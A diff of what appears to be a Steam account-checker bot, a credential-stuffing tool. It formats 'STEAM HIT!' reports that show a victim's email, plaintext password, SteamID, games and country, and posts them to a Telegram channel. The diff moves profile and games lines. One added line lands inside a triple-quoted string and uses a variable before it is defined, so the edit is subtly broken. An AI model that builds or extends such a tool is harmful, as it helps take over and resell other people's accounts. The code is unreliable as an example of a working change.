@@ -1228,6 +1228,7 @@ Try another account!
         # Base header (same for both 2FA and normal)
         text = f"""✅ <b>STEAM HIT!</b>
 
+        text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
 🆔 <b>SteamID:</b> <code>{result.get('steamid', 'N/A')}</code>
@@ -1253,6 +1254,8 @@ Try another account!
 
         result['games_privacy'] = games_privacy
 
+        text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"
+
         # Games section (shows for BOTH 2FA and normal hits)
         if result.get('games_count') is not None:
             if result['games_count'] == 0:
@@ -1270,8 +1273,6 @@ Try another account!
 
         # Country + footer (always at the bottom, only once)
         visibility_emoji = "✅" if result.get('profile_visibility') == "Public" else "🔒" if result.get('profile_visibility') == "Private" else "👥"
-        text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"
-        text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
         text += f"\n🌍 <b>Country:</b> {country_display}"
         text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
         text += f"\nChannel: {CHANNEL_USERNAME}"
